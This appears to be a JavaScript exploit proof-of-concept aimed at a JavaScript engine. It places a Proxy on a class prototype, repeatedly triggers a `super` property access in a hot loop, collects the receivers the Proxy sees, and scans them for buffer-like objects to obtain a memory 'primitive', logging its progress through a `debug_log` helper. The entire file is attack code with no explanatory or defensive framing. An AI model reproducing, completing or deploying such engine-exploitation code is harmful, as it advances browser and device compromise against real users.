import { debug_log } from './module/utils.mjs';


let leaked = [];
let pcre = null;

const proxy = new Proxy({}, {
    get(target, prop, receiver) {
        leaked.push(receiver);
        
        try {
            if (leaked.length === 1000) {
                let buf = new ArrayBuffer(0x100);
                let view = new DataView(buf);
                leaked.push(view);
            }
        } catch(e) {}
        
        return 0x41;
    }
});

class Base {
    constructor() {
        this.buffer = new ArrayBuffer(0x100);
        this.view = new DataView(this.buffer);
    }
    
    trigger() {
        return super.prop;
    }
}

Base.prototype.__proto__ = proxy;

let base = new Base();

for (let i = 0; i < 2000; i++) {
    base.trigger();
}

for (let i = 0; i < leaked.length; i++) {
    try {
        const obj = leaked[i];
        if (obj && obj.byteLength !== undefined) {
            debug_log("Potential memory object found at index: " + i);
            debug_log(" typeof: " + typeof obj);
            debug_log(" toString: " + Object.prototype.toString.call(obj));
            try { debug_log(" constructor: " + (obj.constructor && obj.constructor.name)); } catch(e) {}
            try { debug_log(" byteLength (safe): " + (obj.byteLength)); } catch(e) {}
            pcre = obj;
            break;
        }
    } catch(e) {}
}

if (!pcre) {
    debug_log("No useful primitive yet");
}